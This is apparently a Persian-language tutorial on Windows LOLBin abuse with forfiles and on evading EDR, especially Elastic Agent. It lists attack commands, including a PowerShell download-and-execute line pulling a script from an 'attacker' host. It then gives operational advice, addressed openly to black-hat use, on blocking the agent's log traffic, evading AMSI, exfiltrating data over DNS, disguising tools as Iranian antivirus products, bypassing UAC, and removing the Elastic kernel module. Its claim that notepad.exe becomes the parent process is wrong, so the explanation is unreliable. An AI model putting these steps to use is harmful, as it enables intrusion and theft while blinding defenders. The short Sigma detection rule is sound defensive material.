
 
این کامند یکی از معروف‌ترین و قدیمی‌ترین تکنیک‌های Living-off-the-Land Binaries (LOLBins) برای بای‌پس کردن whitelist و Application Control (AppLocker, WDAC, etc) است.کامند:



```text
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
```

نتیجه نهایی چیه؟وقتی این خط رو تو cmd یا Run یا PowerShell اجرا کنی → ماشین‌حساب (calc.exe) باز میشه  
ولی اجراکننده واقعی notepad.exe نیست! فقط از notepad.exe سوءاستفاده شده تا calc.exe اجرا بشه، در حالی که پروسه پدر (parent process) می‌شود notepad.exe.حالا دقیقاً چی داره اتفاق می‌افته؟ (گام به گام)forfiles.exe یک ابزار قانونی و Microsoft-signed در ویندوز است (از ویندوز Vista به بعد وجود داره) که برای «اجرای یک کامند روی مجموعه‌ای از فایل‌ها» استفاده می‌شه.سینتکس کلیش اینه:



```text
forfiles /p [مسیر] /m [جستجو] /c "command"
```

توضیح پارامترها در این کامند خاص:

| پارامتر | مقدار               | معنی واقعی در این کامند                              |
| ------- | ------------------- | ---------------------------------------------------- |
| /p      | c:\windows\system32 | بگو تو این پوشه دنبال فایل بگرد                      |
| /m      | notepad.exe         | فقط فایلی که اسمش دقیقاً notepad.exe باشه رو پیدا کن |
| /c      | calc.exe            | برای هر فایلی که پیدا شد، این کامند رو اجرا کن       |

تا اینجاش همه‌چیز قانونی و منطقیه:  
«تو پوشه system32 دنبال notepad.exe بگرد، وقتی پیداش کردی، calc.exe رو اجرا کن».اما نکته حیاتی و سوءاستفاده کجاست؟forfiles وقتی می‌خواد کامند /c رو اجرا کنه، یک رفتار خیلی مهم داره:

اگر در بخش /c چیزی نوشتید که پسوند اجرایی داشته باشه (مثل .exe, .bat, .cmd و ...)  
آن را مستقیم و بدون رفتن به cmd.exe اجرا می‌کند!  
و مهم‌تر: آن را با نام خودش (یعنی notepad.exe) اجرا می‌کند نه با forfiles.exe!

یعنی وقتی forfiles می‌بیند که باید calc.exe رو اجرا کنه، در واقع این کار رو می‌کنه:

cmd

```text
C:\Windows\System32\notepad.exe calc.exe
```

نه! اشتباه نکنی، واقعاً notepad.exe اجرا می‌شه، اما چون calc.exe یک برنامه مستقل است، notepad.exe فقط نقش «لانچر» رو داره و فوراً calc.exe رو اجرا می‌کنه و خودش می‌مونه یا می‌بنده.در عمل ویندوز این کار رو با CreateProcess و impersonate کردن انجام می‌ده (تقریباً).نتیجه واقعی در Process Treeوقتی این کامند رو اجرا کنی، در Process Explorer یا Task Manager اینو می‌بینی:

```text
└── cmd.exe (یا powershell.exe یا هر جایی که اجرا کردی)
    └── forfiles.exe
        └── notepad.exe   ←── Parent Process
            └── calc.exe  ←── این اجرا شده ولی پدرش notepad.exe است!
```

چرا این تکنیک خیلی قوی و خطرناکه؟

1. بای‌پس AppLocker / WDAC  
    خیلی از شرکت‌ها فقط اجازه اجرای برنامه‌های داخل C:\Windows\System32\ و Program Files رو می‌دن.  
    notepad.exe مجاز است → پس forfiles اجازه داره notepad.exe رو اجرا کنه  
    اما calc.exe هم داخل System32 هست → پس اجرا می‌شه!
2. Parent Process Spoofing  
    پدر calc.exe می‌شه notepad.exe (کاملاً قانونی و whitelisted)  
    نه cmd.exe یا powershell.exe که معمولاً بلاک یا مانیتور می‌شن.
3. هیچ فایلی روی دیسک نمی‌ریزه  
    کاملاً fileless.
4. هیچ ابزار خارجی لازم نیست  
    forfiles همیشه روی همه ویندوزهای کلاینت و سرور هست.

مثال‌های خطرناک‌تر (تکنیک واقعی در حمله)مهاجم‌ها معمولاً اینجوری ازش استفاده می‌کنن:

cmd

```text
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\windows\temp\evil.exe"
forfiles /p c:\windows\system32 /m certutil.exe /c "powershell -enc xyz..."
forfiles /p c:\windows\system32 /m wmiprvse.exe /c "C:\payload.dll"   (DLL hijacking/sideload)
```

یا حتی reverse shell:

cmd

```text
forfiles /p c:\windows\system32 /m notepad.exe /c "powershell -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://attacker/ps.txt'))"
```

تشخیص (Detection) از دید مدافع

|نشانه|ابزار تشخیص|
|---|---|
|notepad.exe که فرزندش calc.exe, powershell.exe, cmd.exe و ... باشه|Sysmon Event ID 1 با ParentImage: notepad.exe و Image: calc.exe|
|forfiles.exe با آرگومان /c که شامل .exe یا powershell باشه|Command line logging|
|notepad.exe که از مسیرهای غیرمعمولی اجرا شده یا آرگومان داره|Process creation monitoring|

نمونه Sigma rule معروف:

yaml

```yaml
title: Suspicious Notepad.exe Child Process
logsource:
    category: process_creation
detection:
    selection:
        ParentImage: '*\notepad.exe'
        Image|endswith:
            - '\calc.exe'
            - '\cmd.exe'
            - '\powershell.exe'
            - '\mshta.exe'
    condition: selection
level: high
```


---

پس این lolbin یکی از معروف ترین lolbin ها برای تاکتیک execution و تکنیک bypass applocker و parent pid spoofing هست

با استفاده از این روش ما میتونیم خیلی راحت payload خودمون رو اجرا کنیم بدون اینکه Av متوجه بشه اما کما کان توسط EDR های ماننده Elastic Agent به راحتی شناسایی میشویم 

حالا برای اینکه بیایم EDR رو هم بایپس کنیم بهتره که chain که داریم پیش میبریم آروم آروم باشه یعنی تا initial مون رو گرفتیم نیایم malware اصلیمون رو اجرا کنیم بیایم و یک chain طولانی راه بندازیم ساعتش رو به تاخیر بندازیم توسط اسکجول تسک یا crontab و توی همه payload هامون فراینده obfusticate رو پیش ببریم.
اگر داریم روی ویندوز کار میکنیم میتونیم بیایم و از فراینده serialization و deserialization استفاده کنیم 

اگر فرایند رو Red Team یا کلا Black Hat رو داریم پیش میبریم از اسم های ایرانی استفاده کنیم به دلیل نداشتن signature و malisious شناخته شدنشون توسط EDR تا Alert fatige پیش بیاد داخل واحد SOC 

اگر Privielge کردیم از ابزار های sysinternals ماننده process explorer استفاده کنیم و Agent که توسط واحد امنیت اون سازمان روی سیستم کاربران نصب شده تا فرایند لاگ گیری رو پیش ببرد بیایم توسط process explorer ایپی و پورتی که Agent به سرور logslash که معمولا Fleet نام دارد رو بیایم توسط Firewall یک رول outbpund بنویسیم و deny کنیم تا لاگی از سیستم به طرف logslash نره یا اگر الرتی هم می افته چون ایپی و پورت Fleet بلاک شده توسط Firewall دیگه الرتی نمایش داده نمیشود در Firewall و اما همچنان مشکل Prewent  کردن رو داریم فقط دیگه لاگ نمیفرستیم 
چون لاگی دیگه از سمت سیستم نمیره میتونیم بیایم و فرایند Discovery و Credential و سایر تاکتیک هارو پیش ببریم 

از ابزار هایی ماننده defender check میتونیم استفاده کنیم و ابزاری که نوشتیم رو بهش بدیم تا این ابزار از طریق API های خوده windows defender بیاد استفاده کنه و بهمون بگه کجای ابزار ما توسط defener شناسایی میشه 

از ابزار AMSI Treeger متیونیم استفاده کنیم تا ببینم چه بخشی از اسکریپت ما توسط  AMSI و با Severity بالا به سمت ETW ارسال میشه و توسط Defender یا سایر ابزار های مانیتورینگ به عنوان یک اسکریپت مخرب شناسایی میشه 

از ابزار  invisi-shell میتونیم استفاده کنیم تا فرایند hook روی لاگ های پاورشل پیش ببریم تا توسط AMSI شناسایی و بلاک نشویم و دیگر پاورشل لاگی به سمت ETW ارسال نکند و event code 4104 ایجاد نشود  

میتونیم بعد از initial Access مون بیایم و Agent که روی سیستم نصب شده است و داره فراینده مانیتورینگ رو انجام میده مثلا Elastic Agent, ElasticEndpoint میتوینم بیایم و اصلا یک شبکه خودمون راه اندازی کنیم و Elastic بیاریم بالا و اکستیشن های امنیتی Elastic رو نصب کنیم و Agent روی چند ماشین بیاریم بالا و از فریمورک های ماننده Cobalt Strike میتوینم استفاده کنیم برای شبیه سازی حملات (تکنیک ها) تا ببینیم کجاها شناسایی میشیم و Privent میشیم  تا هرجا که شناسایی میشیم بیایم رولی که ما رو شناسایی کرده رو بخونیم ببینیم رولی چه Gap داره چطور میتونیم از دستش فرار کنیم روی مبحث GAP Analysis میتونیم به همین ترتیب کار کنیم 

برای Exfilteration کردن دیتا میتونیم از پروتوکل هایی ماننده DNS استفاده کنیم و اسم ابزاری که قراره این کارو انجام دهد بیایم به اسم انتی ویروس های ایرانی تغییر بدیم تا اگر الرت C2 افتاد تیم SOC نسبت به این قضیه Responce نداشته  باشد 

برای بایپس UAC از ابزار UACME متیونیم استفاده کنیم تا 70 روش رایچ رو روی سیستم برسی کنیم 
یا میتونیم از باینری های AutoElavate خوده Windows ماننده fodhelper استفاده کنیم 

برای بایپس کردن applocker میتونیم از پروسه های تراست خوده ویندوز استفاده کنیم که شامل lolbin ها میشود installutil,msbuild و......




---

 حالا اگه Privielge  کرده باشیم میتونیم بیایم همین کامند رو به جای notepad بریم داخل مسیر Elastic Endpoint و Parent مسیر رو Elastic Endpoint رو بهش بدیم و تو این حالت Elastic رو هم بایپس میکنیم 

---

در سیستم عامل لینوکس اگر Elastic Agent روی سیستم نصب باشه همونطور که میدودنی Agent که توسط واحد SOC اختصاص داده میشود به کاربران با یک توکن installer از سمت واحد soc به admin ها داده و admin این توکن رو روی سیستم مد نظر نصب میکنند و وقتی که این توکن نصب شود روی سیستم تنها راهی که میشود elastic رو پاک کرد در صورت داشتن توکن uninstaller از سمت واحد soc هست اما راه های دیگری هم وجود دارد مثلا عوض کردن سیستم عامل خب این یک راه مسخره یی است و یه جورایی حمله hid یا همون human interfacae device میشود یا حتی اگرم به استفاده از گجت ما اینکارو نکنیم باز هم باید به صورت فیزیکی اینکارو بکنیم خب برای انجام اینکار ما باید ریسک زیادی رو انجام دهیم تا فقط بیایم به خاطر یک Agent بزنیم کل سیستم عامل عوض کنیم  به همین خاطر این کار به شدت مسخرست 

در سیستم عامل ویندوز اگر elastic agent نصب شده باشد و temper protection فعال باشد و یا با داشتن توکن uninstaller میتونیم بیایم و اینکارو انجام بدیم یا در سیستم عامل ویندوز سطح دسترسی trsut installer  رو بگیریم که این کار با وجود این agent تقریبا غیر ممکن است 

Elastic Agent 

به طور کلی دو سرویس کلی داره که یکیش user space و یکی دیگر kernel space حالا در سیستم عامل های unix شاید فکر کنید با داشتن سطح دسترسی root میتونیم بیایم و agnet رو به کل از سیستم پاک کنیم 
مثلا دستور lsmod رو بزنیم و لیست ماژول های کرنل ببینیم و با دستور rmod هم بزنیم حدفش کنیم با اون سرویس user spcase رو خیلی راحت با دستور kill  بزنیم پاکش کنیم اما اینکار نمیشه به این دلیل که این سرویس ها در این شرایط همیدیگر رو کاور میکنن یعنی اگر بخواهید سرویس user رو ببندینش kernel میمونه و به کارش ادامه میده و بخواهید برید تو مسیرش و پاکش کنید ماژول کرنلیه جلوی شمارو میگیرد و اگر هم دست بزارید روی ماژول کرنلی user جلوی شما رو میگیرد 

اما یکی از روش های که میشود ماژول کرنل Elastic رو پاک کرد بدون پاک شدن فایل ها و سایر موارد بازسازی کردن کرنل سیستم عامل هست 

```bash
sudo apt install --reinstall linux-image-$(uname -r)
```
این دستور کرنل فعلی سیستم عامل شمارو پاک میکند و با استفاده از دستور uname -r مشخصات کامل کرنل شما رو میگیرد و همون رو دوباره نصب میکند بعد از نصب مجدد کرنل باید  دستور autoremove رو هم بزنید تا کاملا ماژول از بین برود 

و در نهایت حالا میتونید بیاید و سرویس سطح user رو هم خیلی راحت برید به مسیر فایلش و اصلا پاکش کنید چون این دفه ماژول کرنلی نیستش 

اما دقت کنید که این فرایند باید با سطح دسترسی root اجرا شود 